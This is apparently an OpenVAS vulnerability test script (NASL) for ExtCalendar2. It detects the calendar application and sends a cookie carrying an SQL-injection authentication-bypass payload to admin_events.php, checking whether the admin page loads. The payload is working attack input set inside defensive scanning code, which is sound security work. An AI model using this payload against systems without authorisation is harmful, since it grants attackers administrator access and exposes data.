###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_extcalender_sql_inj_n_auth_bypass_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# ExtCalendar2 SQL Injection and Authentcation Bypass Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to gain the administrator
  privileges and sensitive information.
  Impact Level: Application";
tag_affected = "ExtCalendar2";
tag_insight = "The flaw is due to improper validation of user-supplied input passed
  via the cookie to '/admin_events.php'.";
tag_solution = "No solution or patch is available as of 19th December, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://sourceforge.net/projects/extcal/files/ExtCalendar 2/";
tag_summary = "This host is ExtCalendar2 and is prone to sql injection and
  authentcation bypass vulnerabilities.";

if(description)
{
  script_id(902772);
  script_version("$Revision: 13 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"creation_date", value:"2011-12-19 16:39:11 +0530 (Mon, 19 Dec 2011)");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_name("ExtCalendar2 SQL Injection and Authentcation Bypass Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17562/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/103274/extcalendar2bypass-sql.txt");

  script_description(desc);
  script_summary("Check if ExtCalendar2 is vulnerable to Authentcation Bypass");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get Host Name
host = get_host_name();
if(! host){
  exit(0);
}

foreach dir (make_list("/ext", "/calender", cgi_dirs()))
{
  sndReq = http_get(item:string(dir, "/calendar.php"), port:port);
  rcvRes = http_send_recv(port:port, data:sndReq);

  ## Confirm the application
  if(">Powered by" >< rcvRes || ">ExtCalendar" >< rcvRes)
  {
    ## Constructing requst
    filename = dir + "/admin_events.php";
    exp = "ext20_username=admin ' or '1'= '1; " +
          "ext20_password=admin ' or '1'= '1";
    sndReq2 = string( "GET ", filename, " HTTP/1.1\r\n",
                      "Host: ", host, "\r\n",
                      "User-Agent: OpenVAs-Agent\r\n",
                      "Cookie: ", exp, "\r\n\r\n");

    rcvRes2 = http_keepalive_send_recv(port:port, data:sndReq2);

    ## Check if user is logged in into admin account
    if(">Event Administration<" >< rcvRes2 && ">Logout" >< rcvRes2)
    {
      security_hole(part);
      exit(0);
    }
  }
}
